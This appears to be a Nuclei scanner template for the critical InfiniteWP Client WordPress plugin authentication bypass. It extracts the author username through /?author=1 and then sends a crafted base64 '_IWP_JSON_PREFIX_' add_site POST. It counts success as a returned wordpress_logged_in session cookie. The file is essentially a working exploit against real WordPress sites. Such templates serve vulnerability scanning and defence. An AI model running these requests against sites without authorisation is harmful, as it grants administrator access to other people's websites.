id: wordpress-infinitewp-auth-bypass
info:
  author: princechaddha
  name: WordPress InfiniteWP Client Authentication Bypass
  reference: https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/
  severity: critical
  tags: wordpress,auth-bypass,wp-plugin
requests:
- extractors:
  - group: 1
    internal: true
    name: username
    part: body
    regex:
    - Author:(?:[A-Za-z0-9 -\_="]+)?<span(?:[A-Za-z0-9 -\_="]+)?>([A-Za-z0-9]+)<\/span>
    type: regex
  - group: 1
    internal: true
    name: username
    part: header
    regex:
    - 'ion: https:\/\/[a-z0-9.]+\/author\/([a-z]+)\/'
    type: regex
  matchers:
  - part: header
    type: word
    words:
    - wordpress_logged_in
  - part: body
    type: word
    words:
    - <IWPHEADER>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /?author=1 HTTP/1.1

    Host: {{Hostname}}

    Cache-Control: max-age=0

    Upgrade-Insecure-Requests: 1

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Language: en-US,en;q=0.9

    Connection: close

    '
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel\
    \ Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n\
    Accept-Language: en-US,en;q=0.5\nConnection: close\nUpgrade-Insecure-Requests:\
    \ 1\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\n\
    ContentLength: 3537\n\n_IWP_JSON_PREFIX_{{base64(\"{\\\"iwp_action\\\":\\\"add_site\\\
    \",\\\"params\\\":{\\\"username\\\":\\\"\xA7username\xA7\\\"}}\")}}\n"
  redirects: true
